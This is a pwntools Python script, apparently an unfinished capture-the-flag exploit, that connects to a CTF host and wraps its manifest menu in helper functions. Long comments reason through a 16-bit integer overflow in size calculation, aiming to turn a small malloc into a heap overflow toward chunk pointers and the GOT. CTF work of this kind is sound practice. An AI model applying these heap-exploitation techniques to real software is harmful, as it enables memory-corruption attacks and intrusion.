from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    if len(data) > 0:
        p.recvuntil(b'data:\n')
        p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()

# 0x10008 = 65544, lower 16 bits = 8, chunk size = 0x20.
# Let's use 256 and 256. 256*256 = 65536, lower 16 bits = 0, size = 0x20.
# The `view` function:
# 160c: shl $0x4,%rax
# 1610: lea 0x2129(%rip),%rdx  # 3740
# 1617: add %rdx,%rax
# 161a: movzwl (%rax),%edx     # item count
# 161d: movzwl 0x2(%rax),%eax  # item size
# 1621: imul %rax,%rdx         # 65536 !
# 1625: mov $0x1,%edi          # fd 1 (stdout)
# 162a: call 1130 <write@plt>  # write(1, ptr, 65536)
# It writes 65536 bytes! But `ptr` is 0x3600 (GOT).
# So it writes from 0x3600 up to 0x3600 + 65536. This crosses into unmapped memory and segfaults!!
# THAT's why it crashes when reading!

# If we don't want to crash on `view`, we shouldn't use 256x256 if we want to view it.
# We want:
# (count * size) mod 65536 = 16 (for 0x20 chunk)
# And count * size = small enough not to segfault when reading/writing.
# Wait, the overflow size IS `count * size`. If we want to overflow 0x40 bytes, we need `count * size` to be 0x40.
# BUT we need to overflow to the next chunk!
# To reach the next chunk's `fd`, we only need `count * size` > 0x20.
# For example, `count` = 1, `size` = 48.
# 48 mod 65536 is 48.
# BUT wait, the `malloc` size is `di`.
# If `di` is 48, it allocates `0x40` chunk.
# But we WANT to allocate a `0x20` chunk, so `di` must be <= 24!
# So we need `count * size` to have a lower 16 bits <= 24, but the actual value `count * size` > 32.
# How can `count * size` have a lower 16 bits <= 24, but be > 32?
# The 16-bit multiplication `imul %r14d, %edi` (where both are zero-extended 16-bit values).
# Then it does `movzwl %di, %edi`!
# So `malloc` gets `(count * size) & 0xffff`.
# To get a small `malloc` but large `read/write`:
# We need `count * size` > 0xffff.
# For example, count = 257, size = 255. 257 * 255 = 65535.
# Let's try `count = 1024, size = 64`. 1024 * 64 = 65536 (0x10000). Lower 16 bits = 0 -> size 0x20. Read size = 65536.
# We want Read size to be small, e.g. 100 bytes!
# But `count` and `size` are up to 65535.
# If `count * size` is around 65536 + 100 = 65636.
# 65636 = 2 * 32818 = 4 * 16409. 16409 is prime?
# Let's just find `x * y = 65536 + k` where `k` <= 24, and `x, y` < 65536.
# For k = 8: 65544 = 8 * 8193.
# Let's use `count = 8, size = 8193`.
# `8 * 8193 = 65544`.
# Lower 16 bits = 8.
# `malloc(8)` -> returns 0x20 chunk.
# `read` and `write` use 65544 bytes! That's still 65544 bytes! It will still crash when doing `view` on a GOT address!

p.close()
